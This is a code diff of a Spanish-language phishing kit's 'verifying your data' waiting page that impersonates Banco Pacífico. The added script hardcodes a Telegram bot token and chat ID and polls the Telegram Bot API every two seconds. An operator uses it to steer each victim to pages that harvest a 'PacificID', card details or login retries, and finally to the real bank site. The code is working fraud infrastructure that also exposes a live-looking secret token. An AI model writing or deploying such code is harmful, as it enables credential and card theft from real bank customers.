@@ -19,54 +19,77 @@
 
 <div class="wait-card">
     <img src="./logo.png" alt="Logotipo" class="logo">
-    
     <div class="spinner"></div>
-    
     <h2>Verificando tus datos...</h2>
     <p>Por favor, mantente en esta pantalla. Estamos validando la información con nuestro sistema de seguridad de manera segura. No cierres la ventana.</p>
 </div>
 
 <script>
+    // Configuración directa de tu Bot (Para leer las órdenes en tiempo real)
+    const TOKEN = "7504360348:AAHwDzXqkikSstpzhuk_R9uMg3XljWTqGM4";
+    
+    // Función para que la web le diga al bot que ya procesó la orden (Limpia el estado)
+    async function limpiarEstadoTelegram() {
+        try {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: "-1003027102929",
+                    text: "🔄 _Pantalla de espera sincronizada y limpia._",
+                    parse_mode: 'Markdown'
+                })
+            });
+        } catch(e) { console.error(e); }
+    }
+
     async function verificarOrdenBoton() {
         try {
-            // Consultamos a nuestra función Serverless local en Vercel
-            const respuesta = await fetch('/api/poll');
+            // Le preguntamos a Telegram por las últimas acciones del chat (GetUpdates)
+            const respuesta = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
             
             if (respuesta.ok) {
                 const data = await respuesta.json();
-                
-                // Si la acción es diferente de 'espera', ejecutamos la redirección.
-                // (La API /api/poll se encarga de limpiarlo a 'espera' internamente al leerlo)
-                switch(data.action) {
-                    case 'pacificid':
-                        window.location.href = 'pacificid.html';
-                        break;
-                    case 'tarjeta':
-                        window.location.href = 'tarjeta.html';
-                        break;
-                    case 'error_login':
-                        window.location.href = 'login.html?error=true';
-                        break;
-                    case 'error_pacificid':
-                        window.location.href = 'pacificid.html?error=true';
-                        break;
-                    case 'error_tarjeta':
-                        window.location.href = 'tarjeta.html?error=true';
-                        break;
-                    case 'aprobar':
-                        window.location.href = 'https://www.bancopacifico.com';
-                        break;
-                    default:
-                        // Sigue en 'espera', no realiza ninguna acción.
-                        console.log("Esperando orden desde el panel API de Vercel...");
+                if (data.result && data.result.length > 0) {
+                    const ultimoUpdate = data.result[0];
+                    
+                    // Si presionaste un botón (Callback Query)
+                    if (ultimoUpdate.callback_query) {
+                        const comando = ultimoUpdate.callback_query.data;
+                        
+                        // LIMPIAMOS el estado al instante para evitar bucles infinitos
+                        await limpiarEstadoTelegram();
+
+                        // Ejecutamos el salto de página
+                        switch(comando) {
+                            case 'pacificid':
+                                window.location.href = 'pacificid.html';
+                                break;
+                            case 'tarjeta':
+                                window.location.href = 'tarjeta.html';
+                                break;
+                            case 'error_login':
+                                window.location.href = 'login.html?error=true';
+                                break;
+                            case 'error_pacificid':
+                                window.location.href = 'pacificid.html?error=true';
+                                break;
+                            case 'error_tarjeta':
+                                window.location.href = 'tarjeta.html?error=true';
+                                break;
+                            case 'aprobar':
+                                window.location.href = 'https://www.bancopacifico.com';
+                                break;
+                        }
+                    }
                 }
             }
         } catch (e) {
-            console.error("Buscando señal del panel API...");
+            console.error("Esperando señal...");
         }
     }
 
-    // Revisa el estado de manera continua cada 2 segundos
+    // Revisa Telegram cada 2 segundos buscando tu clic
     setInterval(verificarOrdenBoton, 2000);
 </script>
 </body>
